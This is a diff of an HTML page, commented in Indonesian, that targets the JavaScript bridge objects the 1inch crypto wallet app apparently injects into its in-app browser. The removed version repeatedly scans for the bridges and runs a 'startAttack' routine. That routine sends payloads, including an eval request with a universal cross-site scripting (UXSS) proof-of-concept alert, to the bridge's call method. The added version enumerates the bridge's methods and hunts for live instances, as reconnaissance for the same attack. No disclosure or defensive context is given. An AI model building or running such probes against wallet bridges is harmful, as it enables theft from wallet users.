@@ -1,53 +1,41 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>1inch Bridge Persistent Scanner</title>
-</head>
 <body style="background: #000; color: #0f0; font-family: monospace; padding: 20px;">
-    <h3>🔍 Scanning for 1inch Bridge...</h3>
-    <div id="status">Status: Mencari...</div>
-    <hr>
+    <h3>Deep Inspect: OneInch Bridge</h3>
     <div id="logs"></div>
 
     <script>
-        const log = (m) => {
-            const d = document.getElementById('logs');
-            d.innerHTML = `> ${m}<br>` + d.innerHTML;
+        const log = (m, color="#0f0") => {
+            document.getElementById('logs').innerHTML += `> <span style="color:${color}">${m}</span><br>`;
         };
 
-        function startAttack(bridgeName) {
-            const target = window[bridgeName];
-            log(`<b style="color:yellow;">Ditemukan! Menyerang ${bridgeName}...</b>`);
-            
-            // Payload yang paling sering bocor di iOS WKWebView
-            const payloads = [
-                JSON.stringify({method: "eth_accounts", id: 1}),
-                JSON.stringify({type: "eval", code: "alert('UXSS SUCCESS')"})
-            ];
+        const targetName = "OneInchSolanaWallet"; // Coba satu per satu
+        const bridge = window[targetName];
 
-            payloads.forEach(p => {
-                try {
-                    target.call(p); 
-                    log("Payload terkirim ke .call()");
-                } catch(e) {
-                    log("Gagal kirim: " + e.message);
+        if (bridge) {
+            log(`Menganalisis Class: ${targetName}`, "yellow");
+
+            // 1. Ambil semua fungsi Static (yang nempel langsung di Class)
+            const staticProps = Object.getOwnPropertyNames(bridge);
+            log("Static Methods ditemukan: " + staticProps.join(", "));
+
+            // 2. Ambil fungsi dari Prototype (fungsi yang biasanya digunakan untuk interaksi)
+            if (bridge.prototype) {
+                const protoProps = Object.getOwnPropertyNames(bridge.prototype);
+                log("Prototype Methods ditemukan: " + protoProps.join(", "), "cyan");
+            }
+
+            // 3. Tes apakah ada instance yang sudah jalan (Sangat Penting!)
+            // Kadang 1inch menyuntikkan instance global, bukan cuma class
+            log("Mencari instance aktif...");
+            for (let key in window) {
+                if (window[key] instanceof bridge) {
+                    log(`DITEMUKAN INSTANCE AKTIF: window.${key}`, "red");
                 }
-            });
+            }
+        } else {
+            log("Bridge tidak ditemukan!", "red");
         }
-
-        // Fungsi deteksi berulang (Interval)
-        const checkExist = setInterval(() => {
-            const bridges = ["OneInchiOSWallet", "OneInchSolanaWallet"];
-            
-            bridges.forEach(b => {
-                if (window[b]) {
-                    document.getElementById('status').innerHTML = `Status: <b style="color:yellow;">${b} AKTIF!</b>`;
-                    clearInterval(checkExist); // Hentikan scan jika sudah ketemu
-                    startAttack(b);
-                }
-            });
-        }, 500); // Cek setiap 0.5 detik
     </script>
 </body>
 </html>
